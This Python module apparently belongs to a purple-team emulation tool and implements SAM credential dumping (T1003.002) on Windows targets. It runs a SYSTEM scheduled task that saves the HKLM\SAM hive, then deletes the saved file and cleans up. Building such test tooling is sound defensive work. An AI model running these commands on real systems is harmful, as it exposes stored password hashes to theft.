from __future__ import annotations

import logging
from typing import Any
from uuid import uuid4
from purplestrike.techniques.scripts import delete_temp_files

from purplestrike.models.techniques import ExecutionStatus, TechniqueResult
from purplestrike.techniques.connection import (
    TargetConnection,
    command_error,
    get_connection,
    is_transport_failure,
)

logger = logging.getLogger(__name__)
_artifacts: dict[str, str] = {}


def _command_output(result: Any, limit: int) -> str:
    text = "\n".join(part for part in (result.stdout, result.stderr) if part)
    return text[:limit]


async def execute(target: str, parameters: dict[str, Any]) -> TechniqueResult:
    conn: TargetConnection | None = None
    try:
        conn = await get_connection(target)
        method = (parameters.get("method") or "registry").strip().lower()
        access_result = await conn.run_ps(
            "reg.exe query HKLM\\SAM 2>&1; "
            "reg.exe query HKLM\\SECURITY 2>&1"
        )
        access_output = _command_output(access_result, 1024)
        sam_accessible = access_result.success and "ERROR" not in access_output.upper()
        output_parts = [
            "SAM registry access check: "
            f"{'Accessible' if sam_accessible else 'Access denied'}"
        ]
        if access_output:
            output_parts.append(access_output)
        if is_transport_failure(access_result):
            return TechniqueResult(
                technique_id="T1003.002",
                success=False,
                output="\n".join(output_parts)[:4096],
                error=command_error(access_result)[:1024],
                execution_status=ExecutionStatus.FAILURE,
            )

        if method == "registry":
            sim_result = await conn.run_ps(
                "reg.exe query HKLM\\SAM\\SAM 2>&1 | Select-Object -First 10"
            )
            err_text = (sim_result.stderr or "") + (sim_result.stdout or "")
            if not sim_result.success or "ACCESS DENIED" in err_text.upper() or "ERROR" in err_text.upper():
                prefix = "purplestrike_sam_" + uuid4().hex[:10]
                _artifacts[target] = prefix
                sim_result = await conn.run_ps(
                    "$ErrorActionPreference = 'Stop'; "
                    f"$n = '{prefix}'; "
                    f"$h = Join-Path $env:TEMP '{prefix}.hive'; "
                    f"$o = Join-Path $env:TEMP '{prefix}.txt'; "
                    f"$s = Join-Path $env:TEMP '{prefix}.cmd'; "
                    "'reg save HKLM\\SAM \"' + $h + '\" > \"' + $o + '\" 2>&1' | "
                    "Out-File -FilePath $s -Encoding ASCII; "
                    "$a = New-ScheduledTaskAction -Execute $s; "
                    "Register-ScheduledTask -TaskName $n -Action $a "
                    "-User 'SYSTEM' -RunLevel Highest | Out-Null; "
                    "Start-ScheduledTask -TaskName $n; "
                    "Start-Sleep -Seconds 5; "
                    "$c = Get-Content $o -ErrorAction SilentlyContinue; "
                    "Unregister-ScheduledTask -TaskName $n -Confirm:$false "
                    "2>$null; "
                    "if (Test-Path $h) { "
                    "'SAM hive saved (' + (Get-Item $h).Length + ' bytes)' + [Environment]::NewLine + "
                    "($c -join '; ') } "
                    "else { throw ('SAM hive save failed: ' + ($c -join '; ')) }; "
                    "[IO.File]::Delete($h); [IO.File]::Delete($o); [IO.File]::Delete($s)"
                )
            output_parts.append(
                f"Registry method simulation:\n{_command_output(sim_result, 2048)}"
            )
        elif method == "shadow_copy":
            sim_result = await conn.run_ps(
                "vssadmin.exe list shadows 2>&1; "
                "vssadmin.exe list volumes 2>&1 | Select-Object -First 5"
            )
            output_parts.append(
                f"Shadow copy method simulation:\n{_command_output(sim_result, 2048)}"
            )
        else:
            return TechniqueResult(
                technique_id="T1003.002",
                success=False,
                error=f"Unsupported SAM dump method: {method}",
                output="\n".join(output_parts)[:4096],
                execution_status=ExecutionStatus.FAILURE,
            )
        if not sim_result.success:
            return TechniqueResult(
                technique_id="T1003.002",
                success=False,
                output="\n".join(output_parts)[:4096],
                error=command_error(sim_result)[:1024],
                execution_status=ExecutionStatus.FAILURE,
            )

        return TechniqueResult(
            technique_id="T1003.002",
            success=True,
            output="\n".join(output_parts)[:4096],
            execution_status=ExecutionStatus.SUCCESS,
        )
    except Exception as e:
        logger.error(f"T1003.002 execution failed: {e}")
        return TechniqueResult(
            technique_id="T1003.002",
            success=False,
            error=str(e),
            execution_status=ExecutionStatus.FAILURE,
        )
    finally:
        if conn:
            await conn.disconnect()


async def cleanup(target: str) -> None:
    conn: TargetConnection | None = None
    try:
        prefix = _artifacts.get(target)
        if prefix is None:
            return
        conn = await get_connection(target)
        result = await conn.run_ps(
            f"Unregister-ScheduledTask -TaskName '{prefix}' -Confirm:$false "
            "-ErrorAction SilentlyContinue; " +
            delete_temp_files(f'{prefix}.hive', f'{prefix}.txt', f'{prefix}.cmd')
        )
        if not result.success:
            raise RuntimeError(command_error(result))
        _artifacts.pop(target, None)
    except Exception as e:
        logger.warning(f"T1003.002 cleanup failed: {e}")
    finally:
        if conn:
            await conn.disconnect()
